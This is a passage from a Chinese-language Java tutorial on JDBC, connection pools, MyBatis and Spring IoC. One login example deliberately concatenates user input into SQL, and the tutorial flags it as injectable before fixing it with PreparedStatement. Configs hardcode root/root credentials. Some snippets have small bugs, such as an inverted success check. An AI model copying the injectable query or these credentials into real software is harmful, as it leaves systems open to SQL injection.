2. JDBC 定义了一个叫 java.sql.Driver 的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能完成对数据库的连接操作。 java.sql.DriveManager.getConnection(xxx) 其实就是间接的调用了 java.sql.Drive 类的 connect 方法实现数据库连接的。数据库连接成功后会返回一个叫 java.sql.Connection 的数据库连接对象，一切对数据库的查询操作都将依赖于这个 Connection 对象。

#### 使用

DrvieManager 驱动管理对象功能

注册驱动：

```java
static void registerDriver(Driver driver)
注册与给定的驱动程序 DriverManager
```

代码：

```java
Class.forName("com.mysql.jdbc.Driver")
```

获取数据库连接：

```java
static Connection getConnection(String url,String user,String password)
```

代码：

```java
Connection conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1/sql","root","root");
```

获取执行 sql 的对象：

```java
Statement createStatement()
    
PreparedStatement prepareStatement(String sql)
```

代码：

```java
Statement statement= conn.createStatement();
```

Statement 执行sql 的对象

```java
boolean execute(String sql)   可以执行任意的sql语句
    
int executeUpdate(String sql)  执行DML(insert、update、delete)语句、DDL(create、alter、drop)语句。
    返回值：受影响的行数，可以通过这个判断DML语句是否执行成功，返回值>0的执行成功。
    
ResultSet executeQuery(String sql):  执行DQL(select)语句
```

这里来写一段完整的代码，

```java
import java.sql.*;

public class mysqlTest {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection connection = DriverManager.getConnection("jdbc:mysql://127.0.0.1/security", "root", "root");
        String sql="select * from users";
        Statement statement = connection.createStatement();
        ResultSet resultSet = statement.executeQuery(sql);
        while (resultSet.next()){
            System.out.println(resultSet.getString("username"));
            System.out.println(resultSet.getString("password"));
        }
    }
}
```

为简化操作，我们可以把连接信息配置到 properties 文件里面，

getConnection

jdbc.properties

```properties
url=jdbc:mysql://127.0.0.1:3306/security
user=root
password=root
driver=com.mysql.cj.jdbc.Driver
```

JDBCUtils.java

```java
import java.io.FileReader;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.sql.*;
import java.util.Properties;

public class JDBCUtils {
    private static String url;
    private static String user;
    private static String password;
    private static String driver;

    static{
        try {
            Properties properties = new Properties(); // 创建Properties对象加载配置文件
            ClassLoader classLoader = JDBCUtils.class.getClassLoader();//获取class加载器
            URL resource = classLoader.getResource("jdbc.properties");
            System.out.println(resource);
            URI uri = resource.toURI();
            String path = uri.getPath();// 获取文件路径
            properties.load(new FileReader(path)); // 加载文件

            url = properties.getProperty("url");
            user = properties.getProperty("user");
            password = properties.getProperty("password");
            driver = properties.getProperty("driver");
            Class.forName(driver);

        } catch (IOException | ClassNotFoundException | URISyntaxException e) {
            e.printStackTrace();
        }
    }
    public static Connection getConnection() throws SQLException {
        return DriverManager.getConnection(url,user,password);
    }
    public static void close(Statement statement,Connection connection){
        if (statement!=null){
            try {
                statement.close();
            } catch (SQLException throwables) {
                throwables.printStackTrace();
            }
        }
        if(connection!=null){
            try {
                connection.close();
            } catch (SQLException throwables) {
                throwables.printStackTrace();
            }
        }
    }
    public static void close(ResultSet rs, Statement stmt, Connection conn){
        if( rs != null){
            try {
                rs.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        if( stmt != null){
            try {
                stmt.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        if( conn != null){
            try {
                conn.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {

    }
}
```

Login.java

```java
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Scanner;

public class Login {
    public static void main(String[] args) {
        System.out.println("请输入用户名：");
        Scanner scanner = new Scanner(System.in);
        String username = scanner.nextLine();
        System.out.println("请输入密码：");
        Scanner scanner1 = new Scanner(System.in);
        String password = scanner1.nextLine();
        boolean login = new Login().login(username, password);
        if (login){
            System.out.println("登录成功");
        }else {
            System.out.println("用户名或密码错误");
        }

    }
    public boolean login(String username,String password){
        Connection connection = null;
        Statement statement = null;
        ResultSet resultSet = null;
        if (username==null || password==null){
            return false;
        }
        try {
            connection = JDBCUtils.getConnection();
            String sql = "select * from users where username='"+username+"'and password='"+password+"'";
            System.out.println(sql);
            statement = connection.createStatement();
            resultSet = statement.executeQuery(sql);
            return resultSet.next();
        } catch (SQLException throwables) {
            throwables.printStackTrace();
        }finally {
            JDBCUtils.close(resultSet,statement,connection);
        }
        return false;
    }
}
```

这里使用静态代码块来进行设置，静态代码块在创建对象时只会调用一次。

上面这会产生sql注入。

使用 `PreparedStatement` 预编译

```java
import java.sql.*;
import java.util.Scanner;

public class PreSql {
    public static void main(String[] args) {
        System.out.println("请输入用户名：");
        Scanner scanner = new Scanner(System.in);
        String username = scanner.nextLine();
        System.out.println("请输入密码：");
        Scanner scanner1 = new Scanner(System.in);
        String password = scanner1.nextLine();
        boolean login = new PreSql().login(username, password);
        if (login){
            System.out.println("登录成功");
        }else {
            System.out.println("用户名或密码错误");
        }

    }
    public boolean login(String username,String password){
        Connection connection = null;
        Statement statement = null;
        ResultSet resultSet = null;
        if (username==null || password==null){
            return false;
        }
        try {
            connection = JDBCUtils.getConnection();
            String sql = "select * from users where username= ? and password= ?";
            System.out.println(sql);
            PreparedStatement preparedStatement = connection.prepareStatement(sql);
            preparedStatement.setString(1,username);
            preparedStatement.setString(2,password);
            resultSet = preparedStatement.executeQuery();
            return resultSet.next();
        } catch (SQLException throwables) {
            throwables.printStackTrace();
        }finally {
            JDBCUtils.close(resultSet,statement,connection);
        }
        return false;
    }
}
```

主要

```java
PreparedStatement preparedStatement = connection.prepareStatement(sql);
preparedStatement.setString(1,username);
preparedStatement.setString(2,password);
```

## 数据库连接池

前面使用的jdbc,在每次连接数据库的时候都需要重新建立对象，我们在这里会用到创建一个连接池，每次使用完后归还给连接池。

#### 概念

连接池其实就是一个容器(集合)，存放数据库连接的容器。

当系统初始化好后，容器被创建，容器中会申请一些连接对象，当用户来访问数据库时，从容器中获取连接对象，用户访问完之后，会将连接对象归还给容器。

使用连接池能节约资源使用户访问高效。

#### 连接池实现

#### C3P0创建线程池：

添加 jar 包，

```txt
c3p0-0.9.5.2.jar  c3p0包
mchange-commons-java-0.2.12.jar//c3p0 依赖包
mysql-connector //数据库连接驱动包
```

在 src 目录下创建`c3p0-config.xml` ，进行配置

https://blog.csdn.net/zhanghanlun/article/details/80918422

```xml
<?xml version="1.0" encoding="UTF-8"?>
<c3p0-config>
    <!-- 默认配置，如果没有指定则使用这个配置 -->
    <default-config>
        <property name="user">root</property>
        <property name="password">root</property>
        <property name="jdbcUrl">jdbc:mysql://127.0.0.1:3306/security</property>
        <property name="driverClass">com.mysql.cj.jdbc.Driver</property>
        <property name="checkoutTimeout">30000</property>
        <property name="idleConnectionTestPeriod">30</property>
        <property name="initialPoolSize">3</property>
        <property name="maxIdleTime">30</property>
        <property name="maxPoolSize">100</property>
        <property name="minPoolSize">2</property>
        <property name="maxStatements">200</property>
    </default-config>
    <!-- 命名的配置,可以通过方法调用实现 -->
    <named-config name="test">
        <property name="user">root</property>
        <property name="password">root</property>
        <property name="jdbcUrl">jdbc:mysql://127.0.0.1:3306/security</property>
        <property name="driverClass">com.mysql.cj.jdbc.Driver</property>
        <!-- 如果池中数据连接不够时一次增长多少个 -->
        <property name="acquireIncrement">5</property>
        <!-- 初始化数据库连接池时连接的数量 -->
        <property name="initialPoolSize">20</property>
        <!-- 数据库连接池中的最大的数据库连接数 -->
        <property name="maxPoolSize">25</property>
        <!-- 数据库连接池中的最小的数据库连接数 -->
        <property name="minPoolSize">5</property>
    </named-config>
</c3p0-config>
```

创建连接池代码

```java
import com.mchange.v2.c3p0.ComboPooledDataSource;

import javax.sql.DataSource;
import java.sql.Connection;
import java.sql.SQLException;


public class Test {
    public static void main(String[] args) throws SQLException {
        DataSource dataSource = new ComboPooledDataSource("test");
        Connection connection = dataSource.getConnection();
        System.out.println(connection);
    }
}
```

#### Druid数据库连接池

导包

```txt
druid-1.2.8.jar
```

创建 druid.propertoes 文件

```properties
druid.driverClassName=com.mysql.cj.jdbc.Driver
druid.url=jdbc:mysql://127.0.0.1:3306/security?useSSL=false&characterEncoding=utf-8&serverTimezone=GMT%2B8
druid.username=root
druid.password=root

druid.initialSize=10
druid.maxActive=50
druid.minIdle=5
druid.maxWait=500
```

```java
import com.alibaba.druid.pool.DruidDataSourceFactory;

import javax.sql.DataSource;
import java.io.IOException;
import java.io.InputStream;
import java.sql.Connection;
import java.util.Properties;

public class test {
    public static void main(String[] args) throws Exception {
        Properties properties = new Properties();
        InputStream in = test.class.getClassLoader().getResourceAsStream("druid.properties");
        properties.load(in);
        DataSource dataSource = DruidDataSourceFactory.createDataSource(properties);
        Connection connection = dataSource.getConnection();
        System.out.println(connection);
    }
}
```

连接数据库很方便。

可以定义一个工具类。

```java
import com.alibaba.druid.pool.DruidDataSourceFactory;

import javax.sql.DataSource;
import java.io.IOException;
import java.io.InputStream;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Properties;

public class JDBCUtils {
    private static DataSource ds;

    static {
        Properties pro = new Properties();
        InputStream rs = JDBCUtils.class.getClassLoader().getResourceAsStream("druid.properties");
        try {
            pro.load(rs);
            try {
                ds = DruidDataSourceFactory.createDataSource(pro);

            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }


    }
    //返回连接对象
    public static Connection getConnection() throws SQLException {
        return ds.getConnection();
    }
    public  static void close(Statement stmt, Connection conn){
        if (stmt!=null){
            try {
                stmt.close();
            } catch (SQLException throwables) {
                throwables.printStackTrace();
            }

        }
        if (conn!=null){
            try {
                conn.close();
            } catch (SQLException throwables) {
                throwables.printStackTrace();
            }
        }

    }
    //该方法返回定义好的DataSource对象
    public static DataSource getDataSource(){
        return ds;
    }


}
```

测试：

```java
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

public class test2 {
    public static void main(String[] args) throws SQLException {
        Connection connection = JDBCUtils.getConnection();
        String sql = "select * from users where id=?";
        PreparedStatement preparedStatement = connection.prepareStatement(sql);
        preparedStatement.setString(1,"1");
        ResultSet resultSet = preparedStatement.executeQuery();
        while (resultSet.next()){
            System.out.println(resultSet.getString("id"));
            System.out.println(resultSet.getString("username"));
            System.out.println(resultSet.getString("password"));
        }
        JDBCUtils.close(preparedStatement,connection);
    }
}
```

#### Spring JDBC

Spring框架对JDBC进行简单封装，提供了一个JDBCTemplate对象简化的JDBC开发。

创建对象：

```java
JdbcTemplate template = new JdbcTemplate(ds);
```

常用语法：

* update():执行DML语句。增、删、改语句

* queryForMap():查询结果将结果集封装为map集合，将列名作为key，将值作为value 将这条记录封装为一个map集合

  注意：这个方法查询的结果集长度只能是1

* queryForList():查询结果将结果集封装为list集合

  	* 注意：将每一条记录封装为一个Map集合，再将Map集合装载到List集合中

   * query():查询结果，将结果封装为JavaBean对象
     query的参数：RowMapper
         			* 一般我们使用BeanPropertyRowMapper实现类。可以完成数据到JavaBean的自动封装
         			* new BeanPropertyRowMapper<类型>(类型.class)

   * queryForObject：查询结果，将结果封装为对象
     一般用于聚合函数的查询

Template连接代码：

```java
public class test3 {
    public static void main(String[] args) {
        JdbcTemplate template = new JdbcTemplate(JDBCutils.getDataSource());//从工具类获取对象传入
        String sql = "update users set password =? where id =?";


        int admin = template.update(sql,"500",2);  //参数sql语句需要的参数，再进行执行sql语句
        System.out.println(admin);

    }

```

## Mybatis篇

官方文档： https://mybatis.org/mybatis-3/zh/getting-started.html

前面jdbc进行数据库连接，虽然代码并不复杂，但是比较繁琐，在连接池里也是用到了 JDBC Template 简化了数据库操作的步骤，但是 Template 只是对 JDBC 进行了简单的封装，是一个工具类，并不是一个框架。

#### 概述

Mybatis 是一个优秀的基于Java的持久层框架，它内部封装了 jdbc，使开发者只需要关注 sql 语句本本身。

而不需要花费精力去处理加载驱动、创建链接、创建statement等过程。

mybatis 通过 xml 或注解的方式将要执行的各种 statement 配置起来，并通过 java 对象和 statement 中 sql 的动态参数进行映射生成最终执行的 sql 语句，最后由 mybatis 框架执行 sql 并将结果映射为java对象并返回。

采用ORM思想解决了实体与数据库映射的问题，对JDBC进行了封装，屏蔽了 jdbc api 底层访问细节，使我们不用于 jdbc api 打交道，就可以完成对数据库的持久化操作。

#### 配置

1. 创建maven项目，导入依赖
2. 创建实体类和 dao 的接口
3. 创建 Mybatis 的主配置文件   config.xml
4. 创建映射配置文件 UserDao.xml

pom.xml

```xml
    <dependencies>
        <dependency>
            <groupId>org.mybatis</groupId>
            <artifactId>mybatis</artifactId>
            <version>3.5.9</version>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>8.0.26</version>
        </dependency>
    </dependencies>
```

创建 pojo 实体类 User.java

```java
package pojo;

public class User {
    private int id;
    private String username;
    private String password;

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    @Override
    public String toString() {
        return "User{" +
                "id=" + id +
                ", username='" + username + '\'' +
                ", password='" + password + '\'' +
                '}';
    }
}

```

创建 Dao 层接口，UserDao.java

```java
package dao;

import pojo.User;

import java.util.List;

public interface UserDao {
    List<User> findAll();
}
```

创建 config.xml 指定连接数据库的参数

```java
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <environments default="development">
        <environment id="development">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="com.mysql.cj.jdbc.Driver"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/security"/>
                <property name="username" value="root"/>
                <property name="password" value="root"/>
            </dataSource>
        </environment>
    </environments>
    <!--  指定映射配置文件的位置，映射配置文件指的是每个Dao独立的配置文件  -->
    <mappers>
        <mapper resource="mybatis/UserMapper.xml"/>
    </mappers>
</configuration>
```

还需要一个对应的 UserMapper.xml

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="dao.UserDao">
    <select id="findAll" resultType="pojo.User">
        select * from users
    </select>
</mapper>
```

完成

#### 使用

```java
package test;

import dao.UserDao;
import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;
import pojo.User;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;

public class MybatisTest {
    public static void main(String[] args) throws IOException {
        String resource = "mybatis/config.xml";
        // 1. 读取配置文件
        InputStream inputStream = Resources.getResourceAsStream(resource);
        // 2. 创建 SqlSessionFactory 工厂
        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
        // 3. 使用工厂生产sqlSession 对象
        SqlSession sqlSession = sqlSessionFactory.openSession();
        // 4. 使用SqlSession 创建 Dao接口的代理对象
        UserDao userDao = sqlSession.getMapper(UserDao.class);
        // 5. 使用代理对象执行方法
        List<User> users = userDao.findAll();
        for(User user:users){
            System.out.println(user.toString());
        }
        sqlSession.close();
        inputStream.close();
    }
}
```

目录结构：

![image-20220101155426154](img/image-20220101155426154.png)

#### 注解使用

UserDao1.java

```java
package dao;

import org.apache.ibatis.annotations.Select;
import pojo.User;

public interface UserDao1 {
    @Select("select * from users where id=1")
    User findUserById();
}
```

config.xml 配置

```xml
<mapper class="dao.UserDao1"/>
```

测试

```java
package test;

import dao.UserDao1;
import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;
import pojo.User;

import java.io.IOException;
import java.io.InputStream;

public class MybatisTest2 {
    public static void main(String[] args) throws IOException {
        InputStream inputStream = Resources.getResourceAsStream("mybatis/config.xml");
        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
        SqlSession sqlSession = sqlSessionFactory.openSession();
        UserDao1 mapper = sqlSession.getMapper(UserDao1.class);
        User user = mapper.findUserById();
        System.out.println(user);
    }
}
```

insert

```java
int insertUser(User user);
```

```xml
    <insert id="insertUser" parameterType="pojo.User">
        insert into users(username,password) values(#{username},#{password})
    </insert>
```

```java
    public void insertUser() throws IOException {
        User user = new User();
        user.setUsername("mybatis");
        user.setPassword("mybatispass");
        InputStream in = Resources.getResourceAsStream("mybatis/config.xml");
        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(in);
        SqlSession sqlSession = sqlSessionFactory.openSession();
        UserDao mapper = sqlSession.getMapper(UserDao.class);
        int i = mapper.insertUser(user);
        if(i!=1){
            System.out.println("插入成功");
        }
    }
```

剩下的可以看看官方文档。

https://mybatis.org/mybatis-3/zh/sqlmap-xml.html

## Spring篇

解决企业应用开发的负责行而创建。

Spring使用基本的JavaBean来完成以前只可能有EJB来完成的事情，然而，Spring的用途不仅限于服务器端的开发。从简单性、可测试性和松耦合的角度而言，任何Java应用都可以从Spring中受益。Spring的核心是控制反转（IoC）和面向切面（AOP）。

#### 使用的意义

Dao 接口：

```java
package dao;

public interface userdao {
    void select();
}
```

mysqlDaoImpl:

```java
package dao.impl;

import dao.userdao;

public class mysqlDaoImpl implements userdao {
    @Override
    public void select() {
        System.out.println("mysqlDaoImpl");
    }
}
```

mssqlDaoImpl

```java
package dao.impl;

import dao.userdao;

public class mssqlDaoImpl implements userdao {
    @Override
    public void select() {
        System.out.println("mssqlDaoImpl");
    }
}
```

test1:

```java
package domain;

import dao.impl.mysqlDaoImpl;

public class test1 {
    public static void main(String[] args) {
        mysqlDaoImpl mysqlDao = new mysqlDaoImpl();
        mysqlDao.select();
    }
}
```

我们可以注意到，我们在test类里面想要调用mysql的方法就直接new了一个实现类的对象，那么如果在后面想要mssql的查询的话，就需要修改代码，这样的代码效率不高，而且在后面代码如果多了也不好改了。而且这样写的话控制权全在开发者手里，而不是在用户的手里，要实现什么样的功能控制权应该是在用户手里，而不是开发者手里。

那么这里就可以用到 Spring框架，来实现。虽然是也有其他办法能解决这个问题，但是实现起来代码比较繁琐，那么我们为什么不用更加简单便捷的方法呢？

**Spring是一个轻量级的控制反转IOC和面向切面AOP的容器（框架）**

![image-20220108135919022](img/image-20220108135919022.png)

Spring框架是一个分层架构，由7个定义良好的模块组成，Spring模块构建在核心容器之上。核心容器定义了创建、配置和管理bean的方式

![image-20220108140135944](img/image-20220108140135944.png)

组成Spring框架的每个模块（或组件）都可以单组存在。

* 核心容器：核心容器提供Spring框架的基本功能。核心容器的主要组件是 BeafFactory,它是工厂模式的实现。BeanFactory 使用控制反转(IOC) 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。
* Spring上下文：Spring上下文是一个配置文件，向Spring框架提供上下文信息。Spring上下文包括企业服务。例如：JNDI,EJB.等
* Spring AOP: 通过配置管理特性，Spring AOP模块直接将面向切面的编程功能，集成到了Spring框架中，所以可以很容易地使Spring框架管理任何支持AOP的对象。Spring AOP 模块为基于Spring的应用程序中的对象提供了提供了事务管理功能，通过Spring AOP,不用依赖组件，就可以将声明性事务管理集成到应用程序中去。
* Spring Dao : JDBC Dao 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不同数据库供应商抛出的错误信息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量(例如打开和关闭连接)。Spring DAO 的面向JDBC的异常遵从通用的DAO异常层次结构。
* Spring ORM: Spring框架插入了若干个ORM框架，从而提供了ORM的对象关系工具，其中包括 JDO、Hibernate和iBatis SQL Map .所有这些都遵从Spring的通用事务和Dao异常层次结构。
* Spring Web 模块: web 上下文模块建立在应用程序上下文之上，为基于Web的应用程序提供了上下文。所以，Spring框架支持与Jakarta Struts 的集成。Web模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。
* Spring MVC框架： MVC框架是一个全功能的构建WEB应用程序的MVC实现，通过策略接口，MVC框架变成高度可配置的，MVC容纳了大量视图技术，其中包括JSP、Velocity、Tiles、iText和POI。

#### IOC

新建一个空白的 maven 项目

写一个 UserDao 接口：

```java
package dao;

public interface UserDao {
    public void getUser();
}
```

再写Dao的实现类

```java
package dao.impl;

import dao.UserDao;

public class UserDaoImpl implements UserDao {
    @Override
    public void getUser() {
        System.out.println("获取用户数据");
    }
}
```

写UserService 接口

```java'
package service;

public interface UserService {
    public void getUser();
}
```

然后写 UserService实现类

```java
package service.impl;

import dao.UserDao;
import dao.impl.UserDaoImpl;
import service.UserService;

public class UserServiceImpl implements UserService {
    private UserDao userDao= new UserDaoImpl();

    @Override
    public void getUser() {
        userDao.getUser();
    }
}
```

测试：

```java
package domain;

import service.impl.UserServiceImpl;

public class Test1 {
    public static void main(String[] args) {
        UserServiceImpl userService = new UserServiceImpl();
        userService.getUser();
    }
}
```

这是原来的方式，但是有一些弊端，如下：

把UserDao的实现类增加一个

```java
package dao.impl;

import dao.UserDao;

public class UserDaoMysqlImpl implements UserDao {
    @Override
    public void getUser() {
        System.out.println("mysql获取用户数据");
    }
}
```

紧接着我们要去使用Mysql的话，需要去service实现类里修改对应的实现。

```java
package service.impl;

import dao.UserDao;
import dao.impl.UserDaoImpl;
import dao.impl.UserDaoMysqlImpl;
import service.UserService;

public class UserServiceImpl implements UserService {
//    private UserDao userDao= new UserDaoImpl();
        private UserDao userDao = new UserDaoMysqlImpl();
    @Override
    public void getUser() {
        userDao.getUser();
    }
}
```

这样机会调用 mysql 实现类获取数据。

如果在增加一个 UserDao 的实现类，那么又要去改动。这种方式根本不实用，每次都需要修改代码，这种设计的耦合性太高。

**解决**

可以在需要用到它的地方，不去实现它，而去留出一个接口，利用set 

```java
package service.impl;

import dao.UserDao;
import dao.impl.UserDaoImpl;
import dao.impl.UserDaoMysqlImpl;
import service.UserService;

public class UserServiceImpl implements UserService {
//    private UserDao userDao= new UserDaoImpl();
//        private UserDao userDao = new UserDaoMysqlImpl();
    private UserDao userDao;
    public void setUserDao(UserDao userDao){
        this.userDao = userDao;
    }
    @Override
    public void getUser() {
        userDao.getUser();
    }
}
```

测试：

```java
package domain;

import dao.impl.UserDaoMysqlImpl;
import service.impl.UserServiceImpl;

public class Test2 {
    public static void main(String[] args) {
        UserServiceImpl userService = new UserServiceImpl();
        userService.setUserDao(new UserDaoMysqlImpl());
        userService.getUser();
    }
}
```

区别：根本性的变化，创建对象的主动权交给了调用者。

这种思想从本质上解决了问题，程序员不用再去管理对象的创建，更多的是关注业务的实现，耦合性大大降低，这也是IOC的原型。

**IOC本质**

控制反转(IOC Inversion of Control) ，是一种设计思想，DI (依赖注入)是实现 IOC的一种方法，也可以说DI是IOC的另一种说法。没有IOC的程序，使用面向对象编程，对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建有程序自己控制，控制反转后将对象的创建转移给第三方。

IOC是Spring框架的核心内容，使用多种方式完美的实现了IOC，可以使用XML配置，也可以使用注解，新版本的Spring也可以零配置实现IOC。

Spring容器在初始化时先读取配置文件，根据配置文件或元数据创建与组织对象存入容器中，程序使用时再从 IOC 容器中取出需要的对象。

![image-20220108144007999](img/image-20220108144007999.png)

采用XML配置Bean的时候，Bean的定义信息和实现是分离的，而采用注解的方式可以把两者合为一体，bean的定义信息直接以注解的形式定义在实现类中，从而达到了零配置的目的。

控制反转是一种通过描述(XML或注解)并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转是IOC容器，其实现方法是依赖注入(DI)。

开始：

导入依赖

```xml
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>5.3.13</version>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <version>1.18.22</version>
        </dependency>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.13</version>
            <scope>test</scope>
        </dependency>
```

编写Hello实体类：

```java
package spring.pojo;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@AllArgsConstructor
@NoArgsConstructor
public class Hello {
    private String name;
    private int age;

    public void show(){
        System.out.println("Hello,"+name);
    }
}
```

编写Spring文件， bean.xml:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!--bean就是java对象 , 由Spring创建和管理-->
    <bean id="hello" class="spring.pojo.Hello">
        <property name="name" value="Spring"/>
        <property name="age" value="18"/>
    </bean>

</beans>
```

测试：

```java
    @Test
    public void test(){
        // 解析bean.xml文件，生成管理相应的Bean对象
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("classpath:config/bean.xml");
        // getBean: 参数即为Spring配配置文件中的 id
        Hello hello = (Hello) context.getBean("hello");
        hello.show();
    }
```

* hello对象是由Spring创建的
* hello对象的属性是由Spring容器设置的

这个过程就叫控制反转。

#### IOC创建对象方式

* 通过无参构造方法来创建

实例 User

```java
package spring.pojo;

public class User {
    private String name;
    public User(){
        System.out.println("User 无参构造方法");
    }

    public void setName(String name) {
        System.out.println("User set方法");
        this.name = name;
    }

    public void show(){
        System.out.println("User name =" + name);
    }
}
```

bean.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="user" class="spring.pojo.User">
        <property name="name" value="ioc"></property>
    </bean>

</beans>
```

测试：

```java
    @Test
    public void test(){
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("classpath:config/bean.xml");
        User user = (User) context.getBean("user");
        user.show();
    }
```

输出

```txt
User 无参构造方法
User set方法
User name =ioc
```

说明，此处实例化对象是无参构造实例化的，并且用 set 方法赋值。

* 通过有参构造实例化

User

```java
package spring.pojo;

public class User {
    private String name;

    public User(String name){
        System.out.println("User 有参构造");
        this.name = name;
    }

    public void show(){
        System.out.println("User name =" + name);
    }
}
```

bean.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="user1" class="spring.pojo.User">
        <constructor-arg index="0" value="ioc construct"/>
    </bean>

</beans>
```

测试：

```java
    @Test
    public void test(){
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("classpath:config/bean.xml");
        User user = (User) context.getBean("user1");
        user.show();

    }
```

输出：

```txt
User 有参构造
User name =ioc construct
```

#### Spring配置

* 别名

alias 设置别名，为bean设置别名，可以设置多个别名

```xml
    <alias name="user1" alias="useralias"/>
    <bean id="user1" class="spring.pojo.User">
        <constructor-arg index="0" value="ioc construct"/>
    </bean>
```

* Bean的配置

```xml
<!--bean就是java对象,由Spring创建和管理-->

<!--
   id 是bean的标识符,要唯一,如果没有配置id,name就是默认标识符
   如果配置id,又配置了name,那么name是别名
   name可以设置多个别名,可以用逗号,分号,空格隔开
   如果不配置id和name,可以根据applicationContext.getBean(.class)获取对象;

class是bean的全限定名=包名+类名
-->
<bean id="hello" name="hello2 h2,h3;h4" class="com.kuang.pojo.Hello">
   <property name="name" value="Spring"/>
</bean>
```

* import

团队之间的合作通过 import 导入

```xml
<import resource="{path}/bean.xml"/>
```

* DI   Dependency Injection
  * 依赖注入  DI
  * 依赖：指 Bean对象的创建依赖于容器，bean对象的依赖资源
  * 注入：指Bean对象所依赖的资源，由容器来设置和装配
* 构造器注入  上边案例

#### set注入

* set 注入

  要求被注入的属性，必须有 set 方法， set方法的方法名由 set+ 

  属性首字母大写，如果属性是 boolean类型，没有set方法，是 is。

  Address.java

  ```java
  package pojo;
  
  public class Address {
      private String address;
  
      public String getAddress() {
          return address;
      }
  
      public void setAdress(String address) {
          this.address = address;
      }
  }
  ```

  Student

  ```java
  package pojo;
  
  import java.util.List;
  import java.util.Map;
  import java.util.Properties;
  import java.util.Set;
  
  public class Student {
      private String name;
      private Address address;
      private String[] books;
      private List<String> hobbys;
      private Map<String,String> card;
      private Set<String> games;
      private String wife;
      private Properties info;
  
      public void setName(String name) {
          this.name = name;
      }
  
      public void setAddress(Address address) {
          this.address = address;
      }
  
      public void setBooks(String[] books) {
          this.books = books;
      }
  
      public void setHobbys(List<String> hobbys) {
          this.hobbys = hobbys;
      }
  
      public void setCard(Map<String, String> card) {
          this.card = card;
      }
  
      public void setGames(Set<String> games) {
          this.games = games;
      }
  
      public void setWife(String wife) {
          this.wife = wife;
      }
  
      public void setInfo(Properties info) {
          this.info = info;
      }
      public void show(){
          System.out.println("name="+ name
                  + ",address="+ address.getAddress()
                  + ",books="
          );
          for (String book:books){
              System.out.print("<<"+book+">>\t");
          }
          System.out.println("\n爱好:"+hobbys);
  
          System.out.println("card:"+card);
  
          System.out.println("games:"+games);
  
          System.out.println("wife:"+wife);
  
          System.out.println("info:"+info);
  
      }
  }
  ```

  bean.xml

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <beans xmlns="http://www.springframework.org/schema/beans"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
